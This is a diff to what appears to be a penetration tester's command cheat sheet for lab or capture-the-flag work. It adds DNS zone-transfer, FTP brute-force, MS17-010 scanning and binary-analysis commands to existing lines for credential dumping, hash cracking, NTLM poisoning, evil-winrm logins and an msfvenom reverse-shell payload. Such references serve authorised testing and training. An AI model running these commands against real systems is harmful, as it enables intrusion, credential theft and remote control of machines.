@@ -49,14 +49,23 @@ certipy shadow auto -dc-ip $DCIP -u $USER -hashes $HASH -account $TARGET_USER
 certipy auth -dc-ip $DCIP -pfx administrator.pfx
 # if that fails, drop into an LDAP shell instead
 certipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell
+checksec --file=$FILE
 credspray.sh -t $IP -u findings.txt -c findings.txt
 uv run dementor.py -u $USER -p $PASSWORD -d $DOMAIN $LHOST $IP
+dig $DOMAIN A
+dig -x $IP
+dig axfr $DOMAIN @$IP
+dig $DOMAIN +trace
+nmap --script smb-vuln-ms17-010 -p445 $IP
 evil-winrm -i $IP -u $USER -p $PASSWORD
 evil-winrm -i $IP -u $USER -H $HASH
 evil-winrm -i $IP -u $USER -k
 evil-winrm -i $IP -c pub.pem -k priv.pem -S -r $DOMAIN
 ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 300 -fs 3142
 uv run FindUncommonShares.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'
+wget -m ftp://anonymous:anonymous@$IP/
+ftp $IP
+hydra -l $USER -P /usr/share/wordlists/rockyou.txt ftp://$IP
 uv run gettgtpkinit.py $DOMAIN/$DC -cert-pfx crt.pfx -pfx-pass $PASSWORD out.ccache
 uv run gtfobinsuid.py
 hashcat -m 1000 hashes.ntlm2 /usr/share/wordlists/rockyou.txt --username
@@ -123,6 +132,7 @@ ldapsearch -h $DOMAIN -D '$USER@$DOMAIN' -w $PASSWORD -b 'dc=$DOMAIN,dc=local'
 ldapsearch -H ldap://$IP -LLL -x -b'' -s base '(objectclass=*)'
 ./LinEnum-ng.sh
 lsassy -u $USER -p $PASSWORD -d $DOMAIN $IP
+ltrace -o ltrace.log ./$FILE
 mitm6 -d $DOMAIN --ignore-nofqnd
 msfdb run
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
@@ -159,8 +169,15 @@ openssl pkcs12 -in cert.pfx -out pub.pem -clcerts -nokeys
 openssl pkcs12 -in cert.pfx -out priv.pem -nocerts -nodes
 uv run ldapmonitor.py --dc-ip $IP -u '$USER' -d '$DOMAIN' -p '$PASSWORD'
 uv run pywhisker.py --dc-ip "$IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --target "$TARGET_USER" --action "list"
+readelf -h $FILE
+readelf -S $FILE
+readelf -s $FILE
+readelf -r $FILE
+readelf -d $FILE
 redis-cli -h $IP --user $USER -a $PASSWORD
 Responder -I eth0 -A
+ROPgadget --binary $FILE | grep '$SEARCH'
+ropper --file $FILE --search '$SEARCH'
 rpcclient -U '' -N $IP
 rusthound-ce -d $DOMAIN -u $USER@$DOMAIN -p $PASSWORD -z
 scp nc.exe $USER@$IP:"C:\\users\\$USER"
@@ -171,7 +188,12 @@ impacket-smbclient -k -no-pass $DOMAIN/$USER@$IP
 snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects
 ssh -L 1234:127.0.0.1:1234 $USER@$IP
 ssh -K $USER@$IP
+strace -f -o strace.log ./$FILE
+strace -e trace=file ./$FILE
+strace -e trace=openat,read,write,execve ./$FILE
 ./username-anarchy --input-file ./test-names.txt --select.format first.last
+wasm2wat $FILE -o module.wat
+wasm-decompile $FILE > module.c
 wfuzz -u http://$IP -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 315
 wpscan --url http://$IP --enumerate ap,u,t
 xfreerdp3 /v:$IP /u:$USER /p:$PASSWORD /dynamic-resolution /cert:ignore
